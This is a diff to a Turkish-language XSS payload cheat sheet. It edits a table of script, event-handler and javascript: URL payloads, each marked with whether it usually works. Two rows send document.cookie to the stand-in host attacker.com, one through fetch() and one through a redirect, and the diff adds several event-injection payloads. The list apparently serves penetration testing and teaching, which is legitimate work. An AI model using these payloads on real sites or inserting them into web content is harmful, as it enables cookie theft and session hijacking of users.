@@ -47,11 +47,15 @@ Saldırganlar hedef kullanıcının tarayıcısında zararlı JavaScript kodu ç
 | `<svg/onload=alert('XSS')>` | SVG onload olayı | ✅ |
 | `"><script>alert('XSS')</script>` | HTML injection sonrası XSS | ✅ |
 | `<body onload=alert('XSS')>` | Body yüklenince tetikleme | ✅ |
-| `<script>alert(document.cookie)</script>` | Cookie bilgisi görüntüleme | ⚠️ (HTTPOnly varsa çalışmaz) |
+| `<script>alert(document.cookie)</script>` | Cookie bilgisi görüntüleme (HTTPOnly varsa çalışmaz) | ⚠️ |
 | `<script>alert(document.domain)</script>` | Domain görüntüleme | ✅ |
 | `<script>fetch('https://attacker.com?c='+document.cookie)</script>` | Cookie dışarı gönderme | ⚠️ |
 | `<script>document.location='https://attacker.com?c='+document.cookie</script>` | Yönlendirme ile çalma | ⚠️ |
-| `" onclick="alert(1)` | h1,h2,h3 veya p etiketleri için| ⚠️ |
+| `" onclick="alert(1)` | h1,h2,h3 veya p etiketleri için event injection | ⚠️ |
+| `" onerror="alert(1)` | src etiketleri için event injection | ⚠️ |
+| `" onload="alert(1)` | iframe, body, img gibi yüklenince tetikleme | ⚠️ |
+| `javascript:alert(1)` | href veya src gibi URL attribute’larında çalıştırma | ⚠️ |
+| `"><img src=x onerror=alert(1)>` | HTML element kapatıp img ile XSS | ✅ |
 ---
 
 ## 🕰️ Eski / Çalışma İhtimali Düşük Payload'lar
